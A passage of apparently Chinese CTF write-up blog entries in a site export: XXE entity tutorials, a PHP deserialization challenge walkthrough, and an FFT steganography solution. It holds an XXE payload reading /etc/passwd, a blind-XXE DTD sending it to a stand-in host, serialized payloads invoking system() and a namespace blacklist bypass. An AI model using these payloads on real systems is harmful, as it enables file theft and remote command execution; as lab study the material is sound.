class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer &quot;me&quot;&gt;</span><br><span class="line">&lt;name&gt;&amp;writer;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;!--注：一个实体包括 和(&amp;),名称,分号(;)--&gt;</span><br></pre></td></tr></table></div></figure>        <h5 id="3-2-6-2-参数实体">          <a href="#3-2-6-2-参数实体" class="heading-link"><i class="fas fa-link"></i></a>3.2.6.2 参数实体</h5>      <p>(1)使用 <code>% 实体名</code>(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名; </code>引用<br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &#39;http:&#x2F;&#x2F;darkerbox.com&#39;&gt;&quot;&gt;&#x2F;&#x2F;定义参数实体</span><br><span class="line">%param1;&#x2F;&#x2F;引用参数实体，引用后，值又被xml解析，则internal的值为http:&#x2F;&#x2F;darkerbox.com</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;test&gt;[This is my site] &amp;internal;&lt;&#x2F;test&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/6.png"></p>        <h5 id="3-2-6-3-通用实体">          <a href="#3-2-6-3-通用实体" class="heading-link"><i class="fas fa-link"></i></a>3.2.6.3 通用实体</h5>      <p>用 <code>&amp;实体名; </code>引用的实体，他在DTD 中定义，在 XML 文档中引用</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY test &quot;this is xml&quot; &gt; &#x2F;&#x2F; 在DTD中定义</span><br><span class="line">]&gt;</span><br><span class="line">&lt;cred&gt;&amp;test;&lt;&#x2F;cred&gt;   &#x2F;&#x2F;在xml文档中引用</span><br></pre></td></tr></table></div></figure>        <h5 id="3-2-6-4-参数实体-外部实体">          <a href="#3-2-6-4-参数实体-外部实体" class="heading-link"><i class="fas fa-link"></i></a>3.2.6.4 参数实体+外部实体</h5>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">  %name;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;name;&lt;&#x2F;name&gt;</span><br></pre></td></tr></table></div></figure><p><code>% name</code>(参数实体)是在DTD中被引用的，而<code>&amp;name;</code>是在xml文档中被引用的。</p>        <h5 id="3-2-6-6-外部实体">          <a href="#3-2-6-6-外部实体" class="heading-link"><i class="fas fa-link"></i></a>3.2.6.6 外部实体</h5>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>例子</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;dtd&#x2F;writer.dtd&quot;&gt;  &#x2F;&#x2F;DTD定义</span><br><span class="line">&lt;author&gt;&amp;writer;&lt;&#x2F;author&gt;          &#x2F;&#x2F;xml定义</span><br></pre></td></tr></table></div></figure><p><strong>外部实体类型有</strong></p><p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/7.png"></p><p>XXE主要是利用了DTD引用<strong>外部实体</strong>导致的漏洞。</p>        <h3 id="3-3-Blind-XXE">          <a href="#3-3-Blind-XXE" class="heading-link"><i class="fas fa-link"></i></a>3.3 Blind XXE</h3>      <p>Blind XXE即无回显注入。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE[</span><br><span class="line">&lt;!ENTITY % passwd SYSTEM &quot;&#x2F;ect&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;example.com&#x2F;?%passwd&#39;&gt;&quot;&gt;</span><br><span class="line">&amp;wrapper</span><br><span class="line">]&gt;</span><br><span class="line">&lt;pwn&gt;&amp;send&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></div></figure><p>这样是passwd的值是传不过去的，不能在值中调用实体参数;</p><p>解决办法</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main.xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">evil.dtd</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % passwd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;example.com&#x2F;?%passwd&#39;&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;example.com&#x2F;?CONTENTS_OF_PASSWD&#39;&gt;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020朱雀组-phpweb</title>
      <link href="2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/"/>
      <url>2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/1.png"></p><a id="more"></a><p>F12查看网页源码，没有发现什么有用的信息，</p>        <h2 id="2-burpsuite抓包">          <a href="#2-burpsuite抓包" class="heading-link"><i class="fas fa-link"></i></a>2. burpsuite抓包</h2>      <p>注意到最下面有传入两个参数func和p，func有点像funciton，猜测时执行动作，修改参数</p><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/2.png"></p><p>试了后面的参数，得到过滤了参数system，最后大概摸清楚，func是一个函数名，而p是一个参数，所以可以猜测用func来执行p</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">试了一下func&#x3D;highlight_file&amp;p&#x3D;index.php</span><br><span class="line">有回显但是很乱</span><br><span class="line">然后用func&#x3D;file_get_contents&amp;p&#x3D;index.php</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/3.png"></p><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/4.png"></p><p>得到index.php源码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">       $result = call_user_func($func, $p);</span><br><span class="line">       $a= gettype($result);</span><br><span class="line">       <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> $result;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">       <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">               <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">   $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">       $func = strtolower($func);</span><br><span class="line">       <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>        <h2 id="3-代码审计">          <a href="#3-代码审计" class="heading-link"><i class="fas fa-link"></i></a>3. 代码审计</h2>              <h3 id="3-1-过滤关键字符串">          <a href="#3-1-过滤关键字符串" class="heading-link"><i class="fas fa-link"></i></a>3.1 过滤关键字符串</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span></span><br></pre></td></tr></table></div></figure><p>以上为过滤掉的关键字符串。</p><p>发现<code>unserialize</code>函数没有过滤，所以可以用反序列化对序列化的参数进行转化</p>        <h3 id="3-2-序列化构建">          <a href="#3-2-序列化构建" class="heading-link"><i class="fas fa-link"></i></a>3.2 序列化构建</h3>      <p>可以看出主要时一个<code>Test</code>类，这个类主要时有两个参数<code>func</code>和<code>p</code></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><p>针对这两个参数进行序列化</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $func=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/5.png"></p><p>获得序列化的数据：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="3-3-反序列化绕过">          <a href="#3-3-反序列化绕过" class="heading-link"><i class="fas fa-link"></i></a>3.3 反序列化绕过</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/6.png"></p><p>得到当前目录下的所有文件</p><p><strong>寻找flag文件常用命令小结：</strong></p><ol><li>system(‘ls’) : 列举当前目录下的所有文件</li><li>system(“find / -name flag<em>”)：查找所有文件名匹配flag</em>的文件</li><li><code>system(“cat $(find / -name flag*)”)</code>：打印所有文件名匹配flag*的文件</li></ol><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $func=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;cat $(find / -name flag*&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/7.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:1:&quot;p&quot;;s:25:&quot;cat $(find &#x2F; -name flag*)&quot;;&#125;</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/8.png"></p><p><strong>或者：</strong></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当cat如果被过滤时：</span><br><span class="line">p&#x3D;find &#x2F; -name flag*</span><br><span class="line">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find &#x2F; -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br><span class="line">然后读取文件：</span><br><span class="line">func&#x3D;readfile&amp;p&#x3D;&#x2F;tmp&#x2F;flagoefiu4r93</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/11.png"></p><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/12.png"></p>        <h3 id="3-4-命名空间绕过黑名单">          <a href="#3-4-命名空间绕过黑名单" class="heading-link"><i class="fas fa-link"></i></a>3.4 命名空间绕过黑名单</h3>      <p>在危险函数前面添加<code>\</code></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;\system&amp;p&#x3D;ls</span><br><span class="line">func&#x3D;\system&amp;p&#x3D;cat $(find &#x2F; -name flag*)</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/9.png"></p><p><img src="/2021/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/10.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-2021-冰冰好像藏着秘密</title>
      <link href="2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/"/>
      <url>2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首先">          <a href="#1-首先" class="heading-link"><i class="fas fa-link"></i></a>1. 首先</h2>      <p>获得一个FFT.rar压缩包</p><p><img src="/2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/1.png"></p><a id="more"></a>        <h2 id="2-解压">          <a href="#2-解压" class="heading-link"><i class="fas fa-link"></i></a>2. 解压</h2>      <p>解压失败，放到kali中foremost一下</p><p><img src="/2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/2.png"></p><p>output中是一张冰冰照片</p><p><img src="/2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/3.png"></p>        <h2 id="3-方法一-水印提取">          <a href="#3-方法一-水印提取" class="heading-link"><i class="fas fa-link"></i></a>3. 方法一 水印提取</h2>      <p><img src="/2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/4.png"></p><p><img src="/2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/5.png"></p>        <h2 id="4-方法二-傅叶里变换">          <a href="#4-方法二-傅叶里变换" class="heading-link"><i class="fas fa-link"></i></a>4. 方法二 傅叶里变换</h2>      <p>压缩包的名称为FFT，明显的傅叶里变换，利用傅里叶盲水印即可跑出flag。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;FFT.png&#x27;</span>, <span class="number">0</span>) <span class="comment">#直接读为灰度图像，不过此题已经是灰度图片了</span></span><br><span class="line">f = np.fft.fft2(img)            <span class="comment">#做频率变换</span></span><br><span class="line">fshift = np.fft.fftshift(f)     <span class="comment">#转移像素做幅度谱</span></span><br><span class="line">s1 = np.log(np.abs(fshift))<span class="comment">#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255</span></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;original&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s1,<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/VNCTF-2021-%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Misc-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FFT </tag>
            
            <tag> 图像隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-2021-Ez-game</title>
      <link href="2021/03/27/VNCTF-2021-Ez-game/"/>
      <url>2021/03/27/VNCTF-2021-Ez-game/</url>
      
